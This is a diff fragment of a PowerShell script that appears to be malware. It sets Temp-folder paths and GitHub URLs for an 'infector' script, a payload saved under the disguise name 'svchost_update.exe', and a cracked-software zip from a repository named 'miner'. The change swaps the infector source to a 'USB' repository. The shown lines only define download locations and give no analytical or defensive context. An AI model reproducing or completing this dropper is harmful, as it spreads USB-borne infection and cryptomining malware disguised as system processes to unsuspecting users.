@@ -2,8 +2,8 @@ Start-Sleep -Seconds 15
 
 $logPath = "C:\Windows\Temp\boot_execution_log.txt"
 $logDirectory = Split-Path -Path $logPath -Parent
-$infectorScriptPath = "C:\Windows\Temp\infect.ps1"
-$infectorUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/infect.ps1"
+$infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
+$infectorScriptPath = "C:\Windows\Temp\infector.ps1"
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\svchost_update.exe"
 $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
